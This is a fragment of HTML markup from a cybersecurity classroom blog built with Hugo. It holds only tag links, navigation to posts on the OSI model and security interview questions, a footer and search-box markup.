border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Classroom
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/notes/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Notes
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/osi/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">OSI</span></span></a></div></div><div class="article-link__summary prose dark:prose-invert mt-1 line-clamp-5"></div></div><div class="px-6 pt-4 pb-2"></div></article></section></div></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span class="flex flex-col"><a class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" href=/post/notes-osimodel-explained/><span class=leading-6><span class="inline-block rtl:rotate-180">&larr;</span>&ensp;Notes OSIModel Explained
</span></a><span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2021-04-25T20:20:59+05:30>25 April 2021</time>
</span></span><span class="flex flex-col items-end"><a class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" href=/post/cyber-security-interview-questions-with-answers/><span class=leading-6>Cyber Security Interview Questions With Answers&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
</span></a><span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2021-05-07T19:38:21+05:30>7 May 2021</time></span></span></div></div></footer></article><div id=scroll-to-top class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200"><a href=#the-top class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex list-none flex-col sm:flex-row"><li class="flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/tags/ title=Tags>Tags</a></li><li class="flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/categories/ title=Categories>Categories</a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">YOU CAN REUSE MY CONTENT</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://classroom.anir0y.in/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>